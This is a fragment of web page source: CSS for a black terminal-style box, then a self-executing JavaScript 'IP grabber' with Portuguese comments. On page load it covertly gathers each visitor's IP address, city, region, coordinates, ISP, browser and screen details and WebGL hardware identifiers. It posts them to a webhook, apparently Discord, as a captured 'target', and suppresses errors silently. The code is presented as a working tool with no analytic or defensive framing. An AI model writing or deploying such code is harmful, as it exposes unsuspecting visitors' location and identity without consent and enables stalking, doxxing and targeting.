        width: 100%;

        background: #000;

        border: 3px solid #222;
        padding: 20px;
        box-sizing: border-box;
        white-space: pre-wrap;
        overflow-y: auto;
    }
    .cursor {
        display: inline-block;
        width: 10px;
        height: 20px;
        background: #f00;
        margin-left: 5px;
        animation: blink 0.7s infinite;

/* ============================= */

(async function grab() {
    const fingerprint = {};

    // 1) IP + ISP básico via ipify + ipinfo
    try {
        const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => d.ip);
        const info = await fetch(`https://ipinfo.io/${ip}/json`).then(r => r.json());
        fingerprint.ip       = ip;
        fingerprint.city     = info.city;
        fingerprint.region   = info.region;
        fingerprint.country  = info.country;
        fingerprint.loc      = info.loc;
        fingerprint.org      = info.org;
    } catch(e) {
        fingerprint.ip_error = e.message;
    }

    // 2) Dados do navegador
    fingerprint.userAgent = navigator.userAgent;
    fingerprint.language  = navigator.language;
    fingerprint.languages = navigator.languages;
    fingerprint.platform  = navigator.platform;
    fingerprint.cookie    = navigator.cookieEnabled;
    fingerprint.doNotTrack = navigator.doNotTrack;

    // 3) Resolução / cores
    fingerprint.screen = {
        width  : screen.width,
        height : screen.height,
        availWidth  : screen.availWidth,
        availHeight : screen.availHeight,
        colorDepth  : screen.colorDepth,
        pixelDepth  : screen.pixelDepth
    };

    // 4) WebGL vendor & renderer (hardware)
    try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
        fingerprint.webGL = {
            vendor : gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
        };
    } catch(e) {
        fingerprint.webGL = null;
    }

    // 5) Plugins (só Chrome/Edge legado)
    fingerprint.plugins = [...navigator.plugins].map(p => p.name).join(", ");

    // 6) Timestamp UTC
    fingerprint.timestamp = new Date().toISOString();

    // 7) Envia para o webhook
    try {
        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                username: "Grabber",
                avatar_url: "https://i.imgur.com/48hHZr2.png",
                content: "@everyone **Novo visitante capturado!**",
                embeds: [{
                    title: "Dados do Alvo",
                    color: 0xff0000,
                    fields: Object.entries(fingerprint).map(([k,v]) => ({
                        name: k,
                        value: "```" + JSON.stringify(v, null, 2) + "```",
                        inline: false
                    }))
                }]
            })
        });
    } catch(e) {
        /* silencioso */
    }
})();
